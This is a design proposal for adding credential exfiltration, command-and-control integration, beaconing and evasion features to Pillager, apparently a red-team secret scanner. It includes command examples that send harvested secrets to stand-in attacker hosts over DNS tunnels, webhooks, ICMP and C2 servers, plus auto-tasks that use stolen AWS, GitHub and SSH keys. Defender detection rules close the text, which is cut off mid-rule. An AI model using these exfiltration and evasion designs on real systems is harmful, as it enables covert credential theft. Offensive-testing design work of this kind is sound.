# Pillager Exfiltration & C2 Integration Proposal

## ⚠️ AUTHORIZATION REQUIREMENTS

**CRITICAL**: This feature set is designed EXCLUSIVELY for:
- Authorized penetration testing engagements
- Red team operations with explicit written authorization
- Security research in controlled environments
- Capture The Flag (CTF) competitions
- Defensive security training and education

**Unauthorized use of these features may violate:**
- Computer Fraud and Abuse Act (CFAA) in the United States
- Computer Misuse Act in the United Kingdom
- Similar laws in other jurisdictions
- Organizational policies and employment agreements

**Users MUST obtain explicit written authorization before deploying exfiltration capabilities.**

---

## Executive Summary

This proposal outlines a feature enhancement to differentiate Pillager from passive secret scanning tools like Gitleaks by adding **active response capabilities**. The enhancement enables security professionals to rapidly exfiltrate discovered secrets to centralized storage and integrate findings into command and control (C2) frameworks during authorized security assessments.

### Key Differentiators from Gitleaks

| Feature | Gitleaks | Pillager (Current) | Pillager (Proposed) |
|---------|----------|-------------------|---------------------|
| Secret Detection | ✅ | ✅ | ✅ |
| File System Scanning | ❌ | ✅ | ✅ |
| Multiple Output Formats | ✅ | ✅ | ✅ |
| **Cloud Exfiltration** | ❌ | ❌ | ✅ |
| **C2 Integration** | ❌ | ❌ | ✅ |
| **Real-time Beaconing** | ❌ | ❌ | ✅ |
| **Automated Post-Exploitation** | ❌ | ❌ | ✅ |

---

## Use Cases for Authorized Security Operations

### 1. Red Team Operations
- **Scenario**: During authorized red team engagement, automatically exfiltrate discovered credentials to team infrastructure
- **Benefit**: Real-time visibility into compromised credentials without manual extraction
- **Authorization**: Written engagement contract with defined scope

### 2. Penetration Testing
- **Scenario**: Demonstrate data exfiltration risk to client by securely transferring findings to S3 bucket
- **Benefit**: Concrete evidence of exfiltration risk for executive reporting
- **Authorization**: Statement of Work (SOW) with explicit permission

### 3. Purple Team Exercises
- **Scenario**: Offensive team exfiltrates to C2 while defensive team practices detection
- **Benefit**: Realistic training for blue team detection capabilities
- **Authorization**: Internal security team coordination

### 4. CTF & Security Training
- **Scenario**: Automated scoring and flag submission in competitive environments
- **Benefit**: Streamlined workflow for security training scenarios
- **Authorization**: Competition rules and educational context

---

## Feature Architecture

### Core Design Principles

1. **Modular Design**: Exfiltration modules as plugins to core scanner
2. **Protocol Agnostic**: Support multiple transport mechanisms
3. **Encryption by Default**: All exfiltration uses TLS/encryption
4. **Audit Logging**: Comprehensive logging of all exfiltration activities
5. **Fail-Safe Operations**: Graceful degradation if exfil fails

### Component Overview

```
pillager/
├── pkg/
│   ├── exfil/           # NEW: Exfiltration framework
│   │   ├── exfil.go     # Core exfiltration interface
│   │   ├── s3/          # S3-compatible storage
│   │   ├── http/        # HTTP/HTTPS callbacks
│   │   ├── dns/         # DNS tunneling
│   │   └── webhook/     # Generic webhook support
│   ├── c2/              # NEW: C2 integration framework
│   │   ├── c2.go        # C2 interface
│   │   ├── sliver/      # Sliver C2 integration
│   │   ├── mythic/      # Mythic C2 integration
│   │   ├── covenant/    # Covenant C2 integration
│   │   └── custom/      # Custom C2 protocol
│   └── beacon/          # NEW: Beaconing functionality
│       ├── beacon.go
│       └── scheduler.go
```

---

## Feature Set 1: S3-Compatible Exfiltration

### Overview
Enable automatic upload of discovered secrets to S3-compatible storage solutions (AWS S3, MinIO, DigitalOcean Spaces, Backblaze B2, etc.) during authorized operations.

### Features

#### 1.1 Multi-Protocol S3 Support
- AWS S3 (commercial cloud)
- MinIO (self-hosted, airgapped environments)
- Wasabi, Backblaze B2, DigitalOcean Spaces
- Custom S3-compatible endpoints

#### 1.2 Flexible Upload Modes

**Streaming Mode**
```bash
# Upload findings as they're discovered
pillager hunt /target --exfil s3 --exfil-mode stream \
  --s3-bucket red-team-findings \
  --s3-endpoint s3.amazonaws.com \
  --s3-region us-east-1
```

**Batch Mode**
```bash
# Collect all findings, then upload in single operation
pillager hunt /target --exfil s3 --exfil-mode batch \
  --s3-bucket red-team-findings \
  --batch-size 100
```

**Encrypted Archive Mode**
```bash
# Create encrypted tar.gz and upload
pillager hunt /target --exfil s3 --exfil-mode archive \
  --s3-bucket red-team-findings \
  --encryption-key env:EXFIL_KEY
```

#### 1.3 Data Organization

**Smart Bucketing**
```
s3://red-team-findings/
├── engagements/
│   └── client-2025-01/
│       ├── findings/
│       │   ├── 2025-01-15T14-30-00Z/
│       │   │   ├── aws-credentials.json
│       │   │   ├── github-tokens.json
│       │   │   └── private-keys.json
│       │   └── metadata.json
│       └── reports/
│           └── summary-2025-01-15.html
```

**Metadata Tagging**
- Engagement ID
- Timestamp
- Hostname
- Operating system
- Scanner version
- Rule IDs triggered

#### 1.4 Configuration Options

**Via CLI Flags**
```bash
pillager hunt /target \
  --exfil s3 \
  --s3-bucket my-bucket \
  --s3-region us-west-2 \
  --s3-endpoint https://s3.amazonaws.com \
  --s3-access-key env:AWS_ACCESS_KEY \
  --s3-secret-key env:AWS_SECRET_KEY \
  --s3-prefix engagements/client-name \
  --s3-encryption AES256
```

**Via Configuration File**
```toml
# pillager.toml
[exfil.s3]
enabled = true
mode = "stream"
bucket = "red-team-findings"
region = "us-east-1"
endpoint = "https://s3.amazonaws.com"
prefix = "engagements/{{ .EngagementID }}"
encryption = "AES256"
compress = true
metadata = true

# Credential sources (in order of precedence)
credentials = [
    "env",           # Environment variables
    "file",          # ~/.aws/credentials
    "instance_role"  # EC2 instance role
]

# Filters - only exfiltrate specific finding types
filters = [
    "aws-*",
    "github-*",
    "private-key"
]
```

#### 1.5 Security Features

**Client-Side Encryption**
```bash
# AES-256 encryption before upload
pillager hunt /target --exfil s3 \
  --s3-bucket findings \
  --client-encryption true \
  --encryption-key file:./key.aes256
```

**TLS Certificate Pinning**
```bash
# Pin specific certificate for MITM protection
pillager hunt /target --exfil s3 \
  --s3-endpoint https://minio.redteam.local \
  --tls-pin-cert ./minio-cert.pem
```

**Access Logging**
```bash
# Log all S3 operations to local file
pillager hunt /target --exfil s3 \
  --s3-bucket findings \
  --audit-log /var/log/pillager-exfil.log
```

---

## Feature Set 2: Command & Control Integration

### Overview
Integrate Pillager findings directly into popular C2 frameworks, enabling automated post-exploitation workflows during authorized security assessments.

### Supported C2 Frameworks

#### 2.1 Sliver C2 Integration
```bash
# Register findings with Sliver teamserver
pillager hunt /target --c2 sliver \
  --sliver-host teamserver.local:31337 \
  --sliver-config ./sliver-operator.cfg \
  --beacon-id {{ .ImplantID }}
```

**Features:**
- Automatic task creation in Sliver
- Findings attached to session metadata
- Trigger follow-up commands based on finding types
- Integration with Sliver's credential store

#### 2.2 Mythic C2 Integration
```bash
# Send findings to Mythic server
pillager hunt /target --c2 mythic \
  --mythic-url https://mythic.redteam.local \
  --mythic-api-key env:MYTHIC_API_KEY \
  --callback-id {{ .CallbackID }}
```

**Features:**
- Create artifacts in Mythic database
- Link findings to specific callbacks
- Auto-populate credential store
- Trigger Mythic tasks based on findings

#### 2.3 Covenant C2 Integration
```bash
# Report to Covenant teamserver
pillager hunt /target --c2 covenant \
  --covenant-url https://covenant.local \
  --covenant-token env:COVENANT_TOKEN \
  --grunt-id {{ .GruntID }}
```

#### 2.4 Custom HTTP C2
```bash
# Generic HTTP callback for custom C2
pillager hunt /target --c2 http \
  --c2-url https://c2.example.com/api/findings \
  --c2-method POST \
  --c2-header "Authorization: Bearer ${TOKEN}" \
  --c2-format json
```

### C2 Configuration

```toml
# pillager.toml
[c2]
enabled = true
framework = "sliver"  # sliver, mythic, covenant, http

[c2.sliver]
host = "teamserver.local:31337"
config_file = "./sliver-operator.cfg"
beacon_interval = 60
jitter = 30
auto_tasks = true

# Automated task execution based on findings
[c2.sliver.tasks]
# If AWS keys found, run credential validation
aws-access-key = [
    "aws sts get-caller-identity",
    "aws s3 ls"
]

# If GitHub token found, enumerate repos
github-token = [
    "gh api user",
    "gh repo list"
]

# If SSH key found, attempt to use it
private-key = [
    "ssh-add {{.Secret}}"
]

[c2.mythic]
url = "https://mythic.redteam.local"
api_key_env = "MYTHIC_API_KEY"
callback_id = ""
create_artifacts = true
update_credentials = true

[c2.http]
url = "https://c2.example.com/api/ingest"
method = "POST"
headers = { "X-Api-Key" = "env:C2_API_KEY" }
format = "json"
retry_attempts = 3
timeout = 30
```

### Beaconing & Periodic Updates

```bash
# Continuous monitoring with periodic beaconing
pillager hunt /target --c2 sliver \
  --beacon-mode continuous \
  --beacon-interval 300 \
  --beacon-jitter 60
```

**Beacon Modes:**
- `single`: One-time finding report
- `continuous`: Keep scanning and reporting new findings
- `scheduled`: Cron-like scheduling (e.g., "*/15 * * * *")

---

## Feature Set 3: Exfiltration Channels

### 3.1 HTTP/HTTPS Webhooks
```bash
# Generic webhook delivery
pillager hunt /target --exfil webhook \
  --webhook-url https://hooks.slack.com/... \
  --webhook-format slack

# Multiple simultaneous webhooks
pillager hunt /target \
  --exfil webhook \
  --webhook-url https://discord.com/api/webhooks/... \
  --webhook-url https://api.telegram.org/bot.../sendMessage
```

### 3.2 DNS Exfiltration
```bash
# DNS tunneling for restrictive environments
pillager hunt /target --exfil dns \
  --dns-server ns1.attacker.com \
  --dns-domain exfil.attacker.com \
  --dns-chunk-size 32
```

**DNS Encoding:**
```
# Finding: AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
# Encoded DNS queries:
finding-001.aws.QUtJQUlPU0ZPRE5ON0VYQU1QTEU.exfil.attacker.com
finding-002.aws.QVNDSUFCQ0RFRkdISUpLTE1OT1A.exfil.attacker.com
```

### 3.3 ICMP Tunneling
```bash
# Stealth exfiltration via ICMP
pillager hunt /target --exfil icmp \
  --icmp-target 192.168.1.100 \
  --icmp-interval 5
```

### 3.4 TCP/TLS Socket
```bash
# Direct socket connection
pillager hunt /target --exfil tcp \
  --tcp-host c2.redteam.local:4444 \
  --tcp-tls true \
  --tcp-cert ./server.crt
```

---

## Implementation Roadmap

### Phase 1: Core Exfiltration Framework (Weeks 1-2)

**Tasks:**
1. Create `pkg/exfil` package structure
2. Define `Exfiltrator` interface
3. Implement basic S3 exfiltration
4. Add configuration parsing
5. Create unit tests
6. Update CLI with `--exfil` flags

**Deliverables:**
- Working S3 upload functionality
- Configuration file support
- Basic error handling and retry logic
- Documentation

### Phase 2: S3 Feature Completion (Weeks 3-4)

**Tasks:**
1. Implement streaming vs. batch modes
2. Add client-side encryption
3. Implement compression (gzip, zstd)
4. Add metadata tagging
5. Create S3-compatible endpoint testing (MinIO)
6. Performance optimization for large finding sets

**Deliverables:**
- Complete S3 exfiltration module
- Multi-protocol support (AWS, MinIO, etc.)
- Encryption and compression
- Integration tests

### Phase 3: C2 Integration Framework (Weeks 5-6)

**Tasks:**
1. Create `pkg/c2` package structure
2. Define `C2Client` interface
3. Implement HTTP callback mechanism
4. Add beaconing scheduler
5. Create C2 configuration parsing
6. Implement retry and failover logic

**Deliverables:**
- C2 framework foundation
- Generic HTTP C2 support
- Beaconing functionality
- Configuration system

### Phase 4: Sliver C2 Integration (Week 7)

**Tasks:**
1. Research Sliver gRPC API
2. Implement Sliver client
3. Add session/beacon integration
4. Create automated task triggers
5. Test with Sliver teamserver

**Deliverables:**
- Working Sliver integration
- Automated task execution
- Credential store integration
- Example configurations

### Phase 5: Mythic C2 Integration (Week 8)

**Tasks:**
1. Research Mythic REST API
2. Implement Mythic client
3. Add callback integration
4. Create artifact handling
5. Test with Mythic server

**Deliverables:**
- Working Mythic integration
- Artifact creation
- Callback management
- Documentation

### Phase 6: Additional Exfil Channels (Weeks 9-10)

**Tasks:**
1. Implement DNS exfiltration
2. Add webhook support
3. Create ICMP tunneling (optional)
4. Add TCP/TLS socket exfil
5. Implement channel fallback logic

**Deliverables:**
- Multiple exfil channels
- Automatic failover
- Stealth options
- Performance testing

### Phase 7: Security Hardening & Testing (Week 11)

**Tasks:**
1. Security audit of exfil code
2. Add comprehensive logging
3. Implement rate limiting
4. Add detection evasion options (jitter, delays)
5. Penetration test all features
6. Red team validation

**Deliverables:**
- Security audit report
- Hardened codebase
- Evasion features
- Test reports

### Phase 8: Documentation & Release (Week 12)

**Tasks:**
1. Write comprehensive documentation
2. Create example configurations
3. Record demo videos
4. Write blog post announcement
5. Update README
6. Release v2.0.0

**Deliverables:**
- Complete documentation
- Example scenarios
- Release announcement
- Updated marketing materials

---

## Technical Specifications

### Exfiltrator Interface

```go
// pkg/exfil/exfil.go
package exfil

import (
    "context"
    "github.com/brittonhayes/pillager"
)

// Exfiltrator defines the interface for exfiltrating findings
type Exfiltrator interface {
    // Exfiltrate sends findings to the configured destination
    Exfiltrate(ctx context.Context, findings []pillager.Finding) error

    // ExfiltrateStream sends findings one at a time as they're discovered
    ExfiltrateStream(ctx context.Context, findings <-chan pillager.Finding) error

    // Health checks if the exfiltration channel is available
    Health(ctx context.Context) error

    // Close cleanly shuts down the exfiltrator
    Close() error
}

// Config holds exfiltration configuration
type Config struct {
    Type       string            // s3, http, dns, icmp, etc.
    Mode       string            // stream, batch, archive
    Encryption EncryptionConfig
    Metadata   MetadataConfig
    Retry      RetryConfig
    Options    map[string]string // Type-specific options
}

// EncryptionConfig holds encryption settings
type EncryptionConfig struct {
    Enabled   bool
    Algorithm string // AES256, ChaCha20
    KeySource string // env:VAR_NAME, file:/path, inline:base64
}

// MetadataConfig controls metadata attachment
type MetadataConfig struct {
    IncludeHostname   bool
    IncludeTimestamp  bool
    IncludeOSInfo     bool
    IncludeEngagement bool
    CustomTags        map[string]string
}

// RetryConfig controls retry behavior
type RetryConfig struct {
    MaxAttempts int
    BackoffMs   int
    Timeout     int
}
```

### S3 Exfiltrator Implementation

```go
// pkg/exfil/s3/s3.go
package s3

import (
    "context"
    "github.com/aws/aws-sdk-go-v2/service/s3"
    "github.com/brittonhayes/pillager"
    "github.com/brittonhayes/pillager/pkg/exfil"
)

type S3Exfiltrator struct {
    client     *s3.Client
    bucket     string
    prefix     string
    config     exfil.Config
    encryptor  Encryptor
    compressor Compressor
}

func NewS3Exfiltrator(config exfil.Config) (*S3Exfiltrator, error) {
    // Initialize AWS SDK v2 client
    // Support custom endpoints (MinIO, etc.)
    // Configure encryption and compression
}

func (e *S3Exfiltrator) Exfiltrate(ctx context.Context, findings []pillager.Finding) error {
    // Batch mode: Upload all findings at once
    // 1. Serialize findings to JSON
    // 2. Optionally compress (gzip, zstd)
    // 3. Optionally encrypt (client-side)
    // 4. Generate object key with metadata
    // 5. Upload to S3
    // 6. Verify upload
    // 7. Log operation
}

func (e *S3Exfiltrator) ExfiltrateStream(ctx context.Context, findings <-chan pillager.Finding) error {
    // Stream mode: Upload findings as discovered
    // 1. For each finding:
    //    a. Serialize to JSON
    //    b. Encrypt if configured
    //    c. Upload as individual object
    //    d. Handle errors and retries
}

func (e *S3Exfiltrator) Health(ctx context.Context) error {
    // Check S3 bucket accessibility
    // Verify credentials
    // Test upload permissions
}
```

### C2 Client Interface

```go
// pkg/c2/c2.go
package c2

import (
    "context"
    "github.com/brittonhayes/pillager"
)

// C2Client defines the interface for C2 integrations
type C2Client interface {
    // Register announces the scanner to the C2 server
    Register(ctx context.Context) error

    // SendFindings transmits findings to C2
    SendFindings(ctx context.Context, findings []pillager.Finding) error

    // Beacon sends periodic heartbeat to C2
    Beacon(ctx context.Context) error

    // GetTasks retrieves commands from C2 server
    GetTasks(ctx context.Context) ([]Task, error)

    // ExecuteTask runs a C2-assigned task and reports results
    ExecuteTask(ctx context.Context, task Task) error

    // Unregister cleanly disconnects from C2
    Unregister(ctx context.Context) error
}

// Task represents a command from the C2 server
type Task struct {
    ID        string
    Type      string // scan, upload, execute, etc.
    Command   string
    Arguments map[string]interface{}
    Timeout   int
}

// Config holds C2 configuration
type Config struct {
    Framework     string // sliver, mythic, covenant, http
    BeaconMode    string // single, continuous, scheduled
    BeaconInterval int   // seconds
    BeaconJitter   int   // seconds
    AutoTasks     bool   // Execute tasks automatically
    Options       map[string]string
}
```

### Sliver C2 Implementation

```go
// pkg/c2/sliver/sliver.go
package sliver

import (
    "context"
    "github.com/bishopfox/sliver/client"
    "github.com/brittonhayes/pillager"
    "github.com/brittonhayes/pillager/pkg/c2"
)

type SliverClient struct {
    rpc        client.SliverClient
    config     c2.Config
    sessionID  string
    operatorID string
}

func NewSliverClient(config c2.Config) (*SliverClient, error) {
    // Initialize Sliver gRPC client
    // Authenticate with teamserver
    // Get session/beacon information
}

func (c *SliverClient) SendFindings(ctx context.Context, findings []pillager.Finding) error {
    // Convert findings to Sliver-compatible format
    // Send via gRPC to teamserver
    // Update session metadata
    // Optionally populate credential store
}

func (c *SliverClient) Beacon(ctx context.Context) error {
    // Send heartbeat to Sliver teamserver
    // Update last-seen timestamp
    // Check for pending tasks
}

func (c *SliverClient) GetTasks(ctx context.Context) ([]c2.Task, error) {
    // Query Sliver for pending tasks
    // Filter tasks relevant to this scanner
    // Return task list
}
```

---

## Configuration Examples

### Complete pillager.toml with Exfiltration

```toml
# pillager.toml - Complete configuration example

# Core scanner settings
verbose = true
redact = false
dedupe = true
workers = 8
entropy = 3.0

# Standard scanning rules
[[rules]]
description = "AWS Access Key"
id = "aws-access-key"
regex = '''(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}'''
tags = ["aws", "credentials"]

[[rules]]
description = "GitHub Personal Access Token"
id = "github-pat"
regex = '''ghp_[0-9a-zA-Z]{36}'''
tags = ["github", "token"]

# Exfiltration configuration
[exfil]
enabled = true
channels = ["s3", "webhook"]  # Multiple channels simultaneously

# S3 exfiltration settings
[exfil.s3]
enabled = true
mode = "stream"               # stream, batch, or archive
bucket = "redteam-findings"
region = "us-east-1"
endpoint = "https://s3.amazonaws.com"  # Use MinIO: "https://minio.local:9000"
prefix = "engagements/{{ .Year }}/{{ .Month }}/{{ .Hostname }}"
encryption = "AES256"
compress = true
compress_algorithm = "gzip"   # gzip, zstd, or none

# S3 credentials (in order of precedence)
[exfil.s3.credentials]
source = "env"                 # env, file, instance_role
access_key_env = "AWS_ACCESS_KEY_ID"
secret_key_env = "AWS_SECRET_ACCESS_KEY"

# Only exfiltrate specific finding types
[exfil.s3.filters]
include_rules = [
    "aws-access-key",
    "github-pat",
    "private-key"
]
exclude_rules = ["test-*"]
min_entropy = 3.5

# Metadata to include with uploads
[exfil.s3.metadata]
engagement_id = "CLIENT-2025-01"
operator = "analyst01"
custom_tags = { "team" = "red", "phase" = "internal" }

# Retry configuration
[exfil.s3.retry]
max_attempts = 3
backoff_ms = 1000
timeout_seconds = 30

# Webhook exfiltration (Slack, Discord, custom)
[exfil.webhook]
enabled = true
urls = [
    "https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK",
    "https://discord.com/api/webhooks/YOUR/DISCORD/WEBHOOK"
]
format = "slack"              # slack, discord, json, custom
rate_limit = 10               # Max requests per minute
include_redacted = false

# C2 integration
[c2]
enabled = true
framework = "sliver"          # sliver, mythic, covenant, http

# Sliver configuration
[c2.sliver]
host = "teamserver.redteam.local:31337"
config_file = "./configs/sliver-operator.cfg"  # Sliver mtls config
session_id = ""               # Leave empty for auto-detection
beacon_interval = 300         # 5 minutes
beacon_jitter = 60            # ±60 seconds randomization

# Auto-execute tasks based on findings
[c2.sliver.auto_tasks]
enabled = true

# If AWS keys found, validate them
aws-access-key = [
    "execute -c 'aws sts get-caller-identity'",
    "execute -c 'aws s3 ls'"
]

# If GitHub token found, enumerate
github-pat = [
    "execute -c 'gh api user'",
    "execute -c 'gh repo list --limit 100'"
]

# Mythic C2 configuration (alternative to Sliver)
[c2.mythic]
enabled = false
url = "https://mythic.redteam.local"
api_key_env = "MYTHIC_API_KEY"
callback_id = ""
create_artifacts = true       # Create Mythic artifacts from findings
update_credentials = true     # Add to credential store

# HTTP C2 (custom/generic)
[c2.http]
enabled = false
url = "https://c2.example.com/api/findings"
method = "POST"
headers = { "Authorization" = "Bearer env:C2_TOKEN" }
format = "json"
retry_attempts = 3
timeout_seconds = 30
verify_tls = true

# Beaconing configuration
[beacon]
mode = "continuous"           # single, continuous, scheduled
interval = 300                # seconds
jitter = 30                   # randomization ±seconds
schedule = "*/15 * * * *"     # cron format (if mode=scheduled)

# Audit logging
[audit]
enabled = true
log_file = "/var/log/pillager-exfil.log"
log_level = "info"            # debug, info, warn, error
log_format = "json"           # json or text
include_secrets = false       # NEVER log actual secrets

# Stealth/Evasion options
[stealth]
enabled = false
delay_between_findings = 5    # seconds
random_jitter = 10            # ±seconds
user_agent = "Mozilla/5.0..." # Custom user agent for HTTP
dns_over_https = true         # Use DoH for DNS exfil
```

---

## Security Considerations

### 1. Encryption in Transit
- **Requirement**: All exfiltration channels MUST use encryption (TLS 1.3+)
- **Implementation**: Enforce TLS for S3, HTTPS for webhooks, encrypted DNS tunnels
- **Verification**: Certificate pinning optional but recommended

### 2. Encryption at Rest
- **Recommendation**: Client-side encryption before upload
- **Algorithms**: AES-256-GCM, ChaCha20-Poly1305
- **Key Management**: Never hardcode keys; use env vars, key files, or KMS

### 3. Credential Storage
- **Principle**: Never store credentials in code or config files
- **Sources**: Environment variables, credential files, cloud instance roles
- **Rotation**: Support credential rotation without code changes

### 4. Audit Logging
- **Requirement**: Log all exfiltration attempts (success and failure)
- **Format**: Structured JSON logs for SIEM integration
- **Redaction**: NEVER log actual secrets in audit logs

### 5. Rate Limiting
- **Purpose**: Avoid detection by network monitoring
- **Implementation**: Configurable delays between uploads
- **Jitter**: Randomization to avoid timing patterns

### 6. Fail-Safe Design
- **Principle**: Failed exfiltration should not crash scanner
- **Behavior**: Log errors, optionally fall back to local storage
- **User Control**: Allow users to require successful exfil or continue scanning

### 7. Authorization Checks
- **Pre-Flight**: Verify S3 bucket access before scanning
- **C2 Registration**: Require successful C2 registration before scanning
- **User Confirmation**: Optionally require confirmation before exfiltration starts

### 8. OPSEC Considerations
- **User Agent Randomization**: Avoid tool fingerprinting
- **Traffic Shaping**: Blend in with normal traffic patterns
- **Protocol Selection**: Choose appropriate channel based on environment

---

## Legal and Ethical Compliance

### Authorization Framework

Before using exfiltration features, users MUST have:

1. **Written Authorization**
   - Signed contract or Statement of Work (SOW)
   - Explicit permission for data exfiltration testing
   - Defined scope of authorized systems

2. **Scope Limitations**
   - Clear boundaries on what systems can be scanned
   - Network ranges and domains explicitly listed
   - Prohibited targets documented

3. **Data Handling Agreement**
   - How findings will be stored
   - Encryption requirements
   - Data retention and destruction policies
   - Who has access to exfiltrated data

4. **Incident Response Plan**
   - What to do if unauthorized data is discovered
   - Notification procedures
   - Secure deletion procedures

### Compliance Logging

Pillager will implement a compliance mode:

```bash
pillager hunt /target --exfil s3 \
  --compliance-mode true \
  --authorization-doc ./authorization-signed.pdf \
  --scope-file ./authorized-scope.txt
```

This mode:
- Verifies authorization documentation exists
- Checks targets against authorized scope
- Creates tamper-proof audit trail
- Generates compliance report for client

---

## Differentiation from Competitors

| Feature | Gitleaks | TruffleHog | Pillager (Current) | Pillager (Proposed) |
|---------|----------|------------|-------------------|---------------------|
| Git Repo Scanning | ✅ | ✅ | ❌ | ❌ |
| File System Scanning | ❌ | ❌ | ✅ | ✅ |
| S3 Exfiltration | ❌ | ❌ | ❌ | ✅ |
| C2 Integration | ❌ | ❌ | ❌ | ✅ |
| Real-time Beaconing | ❌ | ❌ | ❌ | ✅ |
| Automated Post-Exploitation | ❌ | ❌ | ❌ | ✅ |
| Red Team Focus | ❌ | ❌ | ❌ | ✅ |
| Interactive TUI | ❌ | ❌ | ✅ | ✅ |
| Custom Templates | ✅ | ❌ | ✅ | ✅ |
| Multiple Output Formats | ✅ | ✅ | ✅ | ✅ |

### Unique Value Propositions

1. **Only filesystem scanner with active exfiltration**
2. **First open-source tool with native C2 integration**
3. **Purpose-built for red team operations**
4. **Cloud-native architecture (S3, webhooks, APIs)**
5. **Compliance and audit logging built-in**
6. **Extensible plugin architecture for custom C2s**

---

## Marketing Messaging

### Tagline
**"Pillager: From Discovery to Exfiltration in Seconds"**

### Positioning Statement
*"While Gitleaks finds secrets in git repos, Pillager finds, exfiltrates, and weaponizes secrets across entire file systems. Purpose-built for red team operations and authorized penetration testing."*

### Key Messages

1. **Speed**: Concurrent scanning + streaming exfil = Real-time results
2. **Stealth**: Multiple covert channels (DNS, ICMP, encrypted HTTPS)
3. **Integration**: Native C2 support eliminates manual copy-paste
4. **Compliance**: Built-in authorization checks and audit logging
5. **Flexibility**: Works with any S3-compatible storage, any C2 framework

---

## Success Metrics

### Technical Metrics
- **Performance**: Scan + exfiltrate 1GB filesystem in < 60 seconds
- **Reliability**: 99.9% successful exfiltration rate
- **Compatibility**: Support 5+ C2 frameworks
- **Latency**: < 5 second delay from finding to S3 (streaming mode)

### Adoption Metrics
- **Downloads**: 10,000+ downloads in first 6 months
- **Stars**: 2,000+ GitHub stars
- **Contributors**: 20+ external contributors
- **Enterprise**: 50+ companies using in authorized testing

### Community Metrics
- **Blog Posts**: 25+ security blogs covering the release
- **Conference Talks**: Presented at 3+ security conferences
- **Training**: Included in 5+ offensive security courses
- **CTF**: Used in 10+ CTF competitions

---

## Risks and Mitigations

### Risk 1: Misuse by Unauthorized Actors
**Mitigation:**
- Prominent warnings in README and documentation
- Required `--authorization-file` flag for exfil features
- Compliance mode that requires authorization proof
- User confirmation prompts before exfiltration starts

### Risk 2: Detection by Security Tools
**Mitigation:**
- Provide OPSEC guidance documentation
- Implement evasion features (jitter, delays, traffic shaping)
- Support multiple stealth channels (DNS, ICMP)
- Offer "low and slow" mode for patient operations

### Risk 3: Legal Liability for Project
**Mitigation:**
- Strong disclaimer in MIT license
- Clear documentation of authorized use only
- Compliance framework built into tool
- Partnership with security training organizations
- Legal review before release

### Risk 4: Community Backlash
**Mitigation:**
- Engage security community early for feedback
- Emphasize defensive use cases (purple team training)
- Highlight legitimate pentesting applications
- Provide detection rules for defenders
- Open source for transparency

### Risk 5: False Sense of Security
**Mitigation:**
- Document limitations clearly
- Emphasize this is ONE tool in red team toolkit
- Provide accuracy metrics and false positive rates
- Recommend validation of findings before exfiltration

---

## Conclusion

This proposal outlines a comprehensive feature set that positions Pillager as the premier offensive secret scanning tool for authorized security operations. By adding S3 exfiltration and C2 integration, Pillager transforms from a passive discovery tool into an active post-exploitation framework component.

### Key Differentiators
1. Only filesystem scanner with native exfiltration
2. First open-source tool with C2 framework integration
3. Purpose-built for red team and pentesting workflows
4. Cloud-native and modern architecture

### Next Steps
1. **Community Feedback**: Share proposal with security community
2. **Architecture Review**: Technical design review with maintainers
3. **Prototype**: Build proof-of-concept S3 exfiltration
4. **Legal Review**: Ensure compliance with regulations
5. **Implementation**: Follow 12-week roadmap
6. **Release**: Launch Pillager v2.0 with exfiltration features

### Timeline
- **Weeks 1-4**: Core exfil framework + S3 completion
- **Weeks 5-8**: C2 integration (Sliver, Mythic)
- **Weeks 9-10**: Additional exfil channels
- **Weeks 11-12**: Security hardening + release

**Estimated Effort**: 12 weeks for full implementation
**Estimated Team Size**: 2-3 developers
**Target Release**: Q2 2025

---

## Appendix A: Example Usage Scenarios

### Scenario 1: Internal Penetration Test

**Objective**: Demonstrate credential exposure risk during authorized internal pentest

**Commands:**
```bash
# Phase 1: Initial reconnaissance scan (no exfil)
pillager hunt /mnt/shared --format json > initial-findings.json

# Phase 2: Exfiltrate high-value findings to team S3 bucket
pillager hunt /mnt/shared \
  --exfil s3 \
  --exfil-mode stream \
  --s3-bucket pentest-client-2025-01 \
  --s3-prefix findings \
  --s3-region us-east-1 \
  --authorization-doc ./signed-sow.pdf \
  --filters "aws-*,github-*,private-key"

# Phase 3: Generate executive report from S3 findings
pillager report --from-s3 pentest-client-2025-01/findings \
  --format html \
  --output executive-report.html
```

### Scenario 2: Red Team Operation with C2

**Objective**: Continuous credential harvesting during multi-week red team engagement

**Commands:**
```bash
# Deploy pillager on compromised host with Sliver implant
# Continuous scanning with C2 beaconing

pillager hunt /home \
  --c2 sliver \
  --sliver-config ./operator.cfg \
  --beacon-mode continuous \
  --beacon-interval 300 \
  --beacon-jitter 60 \
  --exfil s3 \
  --s3-bucket redteam-loot \
  --stealth-mode true \
  --delay-between-findings 10

# Pillager will:
# 1. Scan /home for secrets
# 2. Beacon to Sliver C2 every 5±1 minutes
# 3. Stream findings to S3 as discovered
# 4. Execute auto-tasks when specific secrets found
# 5. Continue running until Sliver session ends
```

### Scenario 3: Purple Team Training

**Objective**: Train blue team to detect secret exfiltration

**Blue Team Setup:**
```bash
# Defensive monitoring
tail -f /var/log/suricata/eve.json | \
  jq 'select(.alert.signature | contains("S3")) | .alert'
```

**Red Team Execution:**
```bash
# Offensive action
pillager hunt /opt/webapp \
  --exfil s3 \
  --s3-bucket purple-team-exercise \
  --exfil-mode stream \
  --stealth-mode false  # Intentionally noisy for training

# Blue team should detect:
# - Unusual S3 API calls from application server
# - Large outbound HTTPS to AWS
# - New S3 bucket connections
```

### Scenario 4: CTF Flag Collection

**Objective**: Automatically discover and submit CTF flags

**Commands:**
```bash
# Custom rule for CTF flag format
cat > ctf-rules.toml <<EOF
[[rules]]
description = "CTF Flag"
id = "ctf-flag"
regex = '''flag\{[a-zA-Z0-9_-]+\}'''
tags = ["ctf"]
EOF

# Scan and submit to webhook
pillager hunt /ctf/challenge \
  --config ctf-rules.toml \
  --exfil webhook \
  --webhook-url https://ctf.example.com/api/submit \
  --webhook-format json \
  --format json
```

---

## Appendix B: Detection Rules for Defenders

To support the defensive security community, here are detection rules for identifying Pillager exfiltration activity:

### Suricata Rules

```suricata
# Detect S3 exfiltration from unusual sources
alert http $HOME_NET any -> $EXTERNAL_NET 443 (
  msg:"Possible Pillager S3 Exfiltration";
  flow:established,to_server;
  content:"s3.amazonaws.com"; http_host;
  content:"PUT"; http_method;
  threshold:type threshold, track by_src, count 10, seconds 60;
  classtype:data-exfiltration;
  sid:1000001;
  rev:1;
)

# Detect MinIO exfiltration
alert http $HOME_NET any -> $EXTERNAL_NET any (
